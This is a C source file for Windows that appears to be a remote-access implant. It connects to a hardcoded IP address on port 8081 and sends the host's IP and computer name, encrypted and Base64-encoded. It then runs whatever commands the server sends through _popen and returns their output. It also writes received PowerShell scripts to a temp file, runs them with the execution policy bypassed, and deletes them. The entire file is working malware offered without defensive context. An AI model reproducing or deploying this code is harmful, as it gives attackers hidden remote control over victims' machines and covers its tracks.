#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <winsock2.h>
#include <windows.h>
#include <wincrypt.h> // For Base64 encoding
#include <bcrypt.h>  

#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "bcrypt.lib")
#pragma comment(lib, "crypt32.lib")

#define BUFFER_SIZE 4096
#define AES_KEY_SIZE 16  // 16 bytes for AES-128
#define AES_BLOCK_SIZE 16
#define COMMAND_DELIMITER ";;;"

// Hardcoded AES key for both encryption and decryption (16 bytes)
BYTE hardcoded_key[AES_KEY_SIZE] = "xxxxxxxxxxxxxxxx";

// Function prototypes
void create_socket(SOCKET *client_socket);
void connect_to_server(SOCKET client_socket);
void receive_commands(SOCKET client_socket);
void execute_script(const char *script);
int encrypt_data(const BYTE *plaintext, DWORD plaintext_size, BYTE *ciphertext, DWORD *ciphertext_size);
int decrypt_data(const BYTE *ciphertext, DWORD ciphertext_size, BYTE *plaintext, DWORD *plaintext_size);
void pkcs7_pad(const BYTE *plaintext, DWORD plaintext_size, BYTE **padded_plaintext, DWORD *padded_size);
void pkcs7_unpad(BYTE *padded_plaintext, DWORD *unpadded_size);
char* base64_encode(const BYTE *data, DWORD data_length);
BYTE* base64_decode(const char *b64_string, DWORD *output_length);

// Function to create a socket
void create_socket(SOCKET *client_socket) {
    *client_socket = socket(AF_INET, SOCK_STREAM, 0);
    if (*client_socket == INVALID_SOCKET) {
        fprintf(stderr, "Socket creation failed. Error Code: %d\n", WSAGetLastError());
        WSACleanup();
        exit(EXIT_FAILURE);
    }
}

// Function to connect to the server
void connect_to_server(SOCKET client_socket) {
    struct sockaddr_in server_addr;
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(8081);
    server_addr.sin_addr.s_addr = inet_addr("65.2.78.214");

    if (connect(client_socket, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
        fprintf(stderr, "Connection to server failed. Error Code: %d\n", WSAGetLastError());
        closesocket(client_socket);
        WSACleanup();
        exit(EXIT_FAILURE);
    }

    char client_ip[16];
    int client_port;
    getsockname(client_socket, (struct sockaddr *)&server_addr, &(int){sizeof(server_addr)});
    strcpy(client_ip, inet_ntoa(server_addr.sin_addr));
    client_port = ntohs(server_addr.sin_port);

    char hostname[MAX_PATH];
    GetComputerNameA(hostname, &(DWORD){sizeof(hostname)});

    char flags[BUFFER_SIZE];
    snprintf(flags, sizeof(flags), "IP_ADDRESS**%s**PORT_NUMBER**%d**HOSTNAME**%s", client_ip, client_port, hostname);

    // Print the message before encryption
    // printf("Message before encryption: %s\n", flags);

    // Encrypt the flags before sending
    BYTE encrypted_flags[BUFFER_SIZE];
    DWORD encrypted_size = sizeof(encrypted_flags);
    encrypt_data((BYTE *)flags, strlen(flags), encrypted_flags, &encrypted_size);

    // Base64 encode the encrypted data
    char *b64_encrypted_flags = base64_encode(encrypted_flags, encrypted_size);

    // Print the encrypted (Base64 encoded) message
    // printf("Message after encryption (Base64): %s\n", b64_encrypted_flags);

    // Send the Base64 encoded encrypted flags to the server
    send(client_socket, b64_encrypted_flags, strlen(b64_encrypted_flags), 0);

    // Free the Base64 encoded string
    free(b64_encrypted_flags);
}

// Function to execute a script
void execute_script(const char *script) {
    char temp_script_path[MAX_PATH];
    GetTempPathA(MAX_PATH, temp_script_path);
    strcat(temp_script_path, "temp_script.ps1");

    FILE *file = fopen(temp_script_path, "w");
    if (file == NULL) {
        perror("Failed to create temporary script file");
        return;
    }

    fputs(script, file);
    fclose(file);

    char command[MAX_PATH + 50];
    sprintf(command, "powershell.exe -ExecutionPolicy Bypass -File %s", temp_script_path);

    system(command);
    remove(temp_script_path);  // Delete the script after execution
}

// AES-128 encryption using ECB mode with PKCS#7 padding
int encrypt_data(const BYTE *plaintext, DWORD plaintext_size, BYTE *ciphertext, DWORD *ciphertext_size) {
    BCRYPT_ALG_HANDLE hAlgorithm = NULL;
    BCRYPT_KEY_HANDLE hKey = NULL;
    BYTE *padded_plaintext = NULL;
    DWORD padded_size = 0;
    ULONG result_size = 0;

    // Open AES algorithm provider
    if (BCryptOpenAlgorithmProvider(&hAlgorithm, BCRYPT_AES_ALGORITHM, NULL, 0) != 0) {
        return -1;
    }

    // Set ECB mode (no IV required)
    if (BCryptSetProperty(hAlgorithm, BCRYPT_CHAINING_MODE, (PUCHAR)BCRYPT_CHAIN_MODE_ECB, sizeof(BCRYPT_CHAIN_MODE_ECB), 0) != 0) {
        BCryptCloseAlgorithmProvider(hAlgorithm, 0);
        return -1;
    }

    // Generate AES key
    if (BCryptGenerateSymmetricKey(hAlgorithm, &hKey, NULL, 0, hardcoded_key, AES_KEY_SIZE, 0) != 0) {
        BCryptCloseAlgorithmProvider(hAlgorithm, 0);
        return -1;
    }

    // Pad the plaintext using PKCS#7
    pkcs7_pad(plaintext, plaintext_size, &padded_plaintext, &padded_size);

    // Perform encryption
    if (BCryptEncrypt(hKey, (PUCHAR)padded_plaintext, padded_size, NULL, NULL, 0, ciphertext, *ciphertext_size, &result_size, 0) != 0) {
        free(padded_plaintext);
        BCryptDestroyKey(hKey);
        BCryptCloseAlgorithmProvider(hAlgorithm, 0);
        return -1;
    }

    *ciphertext_size = result_size;

    // Clean up
    free(padded_plaintext);
    BCryptDestroyKey(hKey);
    BCryptCloseAlgorithmProvider(hAlgorithm, 0);

    return 0;
}

// AES-128 decryption with PKCS#7 unpadding using ECB mode
int decrypt_data(const BYTE *ciphertext, DWORD ciphertext_size, BYTE *plaintext, DWORD *plaintext_size) {
    BCRYPT_ALG_HANDLE hAlgorithm = NULL;
    BCRYPT_KEY_HANDLE hKey = NULL;
    ULONG result_size = 0;

    // Open AES algorithm provider
    if (BCryptOpenAlgorithmProvider(&hAlgorithm, BCRYPT_AES_ALGORITHM, NULL, 0) != 0) {
        return -1;
    }

    // Set ECB mode (no IV required)
    if (BCryptSetProperty(hAlgorithm, BCRYPT_CHAINING_MODE, (PUCHAR)BCRYPT_CHAIN_MODE_ECB, sizeof(BCRYPT_CHAIN_MODE_ECB), 0) != 0) {
        BCryptCloseAlgorithmProvider(hAlgorithm, 0);
        return -1;
    }

    // Generate AES key
    if (BCryptGenerateSymmetricKey(hAlgorithm, &hKey, NULL, 0, hardcoded_key, AES_KEY_SIZE, 0) != 0) {
        BCryptCloseAlgorithmProvider(hAlgorithm, 0);
        return -1;
    }

    // Perform decryption
    if (BCryptDecrypt(hKey, (PUCHAR)ciphertext, ciphertext_size, NULL, NULL, 0, plaintext, *plaintext_size, &result_size, 0) != 0) {
        BCryptDestroyKey(hKey);
        BCryptCloseAlgorithmProvider(hAlgorithm, 0);
        return -1;
    }

    *plaintext_size = result_size;

    // Clean up
    BCryptDestroyKey(hKey);
    BCryptCloseAlgorithmProvider(hAlgorithm, 0);

    // Remove padding from the decrypted plaintext
    pkcs7_unpad(plaintext, plaintext_size);

    return 0;
}

// PKCS#7 padding function
void pkcs7_pad(const BYTE *plaintext, DWORD plaintext_size, BYTE **padded_plaintext, DWORD *padded_size) {
    DWORD padding_len = AES_BLOCK_SIZE - (plaintext_size % AES_BLOCK_SIZE);
    *padded_size = plaintext_size + padding_len;
    *padded_plaintext = (BYTE *)malloc(*padded_size);

    memcpy(*padded_plaintext, plaintext, plaintext_size);
    memset(*padded_plaintext + plaintext_size, padding_len, padding_len);  // Add padding bytes
}

// PKCS#7 unpadding function
void pkcs7_unpad(BYTE *padded_plaintext, DWORD *unpadded_size) {
    BYTE padding_len = padded_plaintext[*unpadded_size - 1];
    *unpadded_size -= padding_len;
}

// Base64 encode function
char* base64_encode(const BYTE *data, DWORD data_length) {
    DWORD b64_length = 0;
    char *b64_string = NULL;

    // Calculate the length required for the Base64 encoded string
    if (!CryptBinaryToStringA(data, data_length, CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, NULL, &b64_length)) {
        return NULL;
    }

    // Allocate memory for the Base64 encoded string
    b64_string = (char *)malloc(b64_length);
    if (!CryptBinaryToStringA(data, data_length, CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, b64_string, &b64_length)) {
        free(b64_string);
        return NULL;
    }

    return b64_string;
}

// Base64 decode function
BYTE* base64_decode(const char *b64_string, DWORD *output_length) {
    BYTE *decoded_data = NULL;

    // Calculate the length of the decoded data
    if (!CryptStringToBinaryA(b64_string, 0, CRYPT_STRING_BASE64, NULL, output_length, NULL, NULL)) {
        return NULL;
    }

    // Allocate memory for the decoded data
    decoded_data = (BYTE *)malloc(*output_length);
    if (decoded_data == NULL) {
        return NULL;
    }

    // Decode the Base64 string
    if (!CryptStringToBinaryA(b64_string, 0, CRYPT_STRING_BASE64, decoded_data, output_length, NULL, NULL)) {
        free(decoded_data);
        return NULL;
    }

    return decoded_data;
}

// Function to receive commands from the server
void receive_commands(SOCKET client_socket) {
    char buffer[BUFFER_SIZE];
    int bytes_received;

    while (1) {
        memset(buffer, 0, BUFFER_SIZE);

        // Receive Base64 encoded encrypted data from the server
        bytes_received = recv(client_socket, buffer, BUFFER_SIZE, 0);
        if (bytes_received <= 0) {
            break;
        }

        buffer[bytes_received] = '\0';  // Null-terminate the received data

        // printf("Received Base64 encoded data: %s\n", buffer);
        // Base64 decode the received encrypted data
        DWORD decoded_size = 0;
        BYTE *decoded_data = base64_decode(buffer, &decoded_size);
        if (decoded_data == NULL) {
            printf("Failed to decode Base64 data\n");
            continue;
        }

        // Decrypt the Base64 decoded data
        BYTE decrypted_buffer[BUFFER_SIZE];
        DWORD decrypted_size = BUFFER_SIZE;
        decrypt_data(decoded_data, decoded_size, decrypted_buffer, &decrypted_size);
        decrypted_buffer[decrypted_size] = '\0';  // Null-terminate the decrypted data

        // Now process the decrypted data
        // printf("Received (decrypted): %s\n", decrypted_buffer);

        free(decoded_data);  // Free the decoded data

        // Handle commands
        if (strncmp((char *)decrypted_buffer, "EXIT_CLIENT", 11) == 0) {
            break;
        }

        if (strcmp(decrypted_buffer, "SCRIPT_START") == 0) {
            char script[BUFFER_SIZE * 10] = {0};
            while (1) {
                memset(buffer, 0, BUFFER_SIZE);
                bytes_received = recv(client_socket, buffer, BUFFER_SIZE, 0);
                if (bytes_received <= 0) break;
                buffer[bytes_received] = '\0';
                if (strstr(buffer, "SCRIPT_END") != NULL) {
                    strncat(script, buffer, bytes_received - strlen("SCRIPT_END"));
                    break;
                }
                strncat(script, buffer, bytes_received);
            }
            execute_script(script);
            const char *response = "Script executed successfully.";
            send(client_socket, response, strlen(response), 0);
            continue;
        }

        FILE *fp = _popen(decrypted_buffer, "r");
        if (fp) {
            char command_buffer[BUFFER_SIZE] = {0};
            while (fgets(buffer, sizeof(buffer) - 1, fp) != NULL) {
                strncat(command_buffer, buffer, sizeof(command_buffer) - strlen(command_buffer) - 1);
            }
            _pclose(fp);

            // Encrypt the command result before sending
            BYTE encrypted_result[BUFFER_SIZE];
            DWORD encrypted_size = sizeof(encrypted_result);
            encrypt_data((BYTE *)command_buffer, strlen(command_buffer), encrypted_result, &encrypted_size);

            // Base64 encode the encrypted result
            char *b64_encrypted_result = base64_encode(encrypted_result, encrypted_size);

            // Send the Base64 encoded encrypted result to the server
            send(client_socket, b64_encrypted_result, strlen(b64_encrypted_result), 0);

            // Free the Base64 encoded result
            free(b64_encrypted_result);
        } else {
            const char *error_response = "Command execution failed.";
            send(client_socket, error_response, strlen(error_response), 0);
        }
    }

    closesocket(client_socket);
}

int main() {
    WSADATA wsaData;
    SOCKET client_socket;

    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        fprintf(stderr, "Failed to initialize Winsock. Error Code: %d\n", WSAGetLastError());
        return EXIT_FAILURE;
    }

    create_socket(&client_socket);
    connect_to_server(client_socket);
    receive_commands(client_socket);

    WSACleanup();
    return EXIT_SUCCESS;
}
